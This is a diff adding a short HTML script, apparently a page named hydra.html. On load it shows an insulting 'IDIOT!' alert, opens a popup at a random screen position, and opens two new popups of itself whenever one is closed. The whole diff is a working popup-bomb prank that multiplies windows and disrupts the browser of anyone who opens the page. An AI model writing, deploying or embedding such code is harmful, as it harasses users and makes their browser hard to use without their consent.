@@ -1,0 +1,20 @@
+<script>
+    document.title = "IDIOT!";
+    alert("IDIOT!");
+    function RB(min, max) {
+        return Math.floor(Math.random() * (max - min + 1) + min);
+    }
+    var w = window.open('hydra.html','','HEIGHT=100,WIDTH=100');
+    w.moveTo(RB(0, screen.width), RB(0, screen.height));
+    var s = 0;
+    function check() {
+        if(s == 1) return null;
+        if(w.closed) {
+        s = 1;
+        for(let i = 0; i < 2; i++) {
+            window.open('hydra.html','','HEIGHT=100,WIDTH=100');
+        } 
+        }
+    }
+    setInterval(check, 100);
+</script>
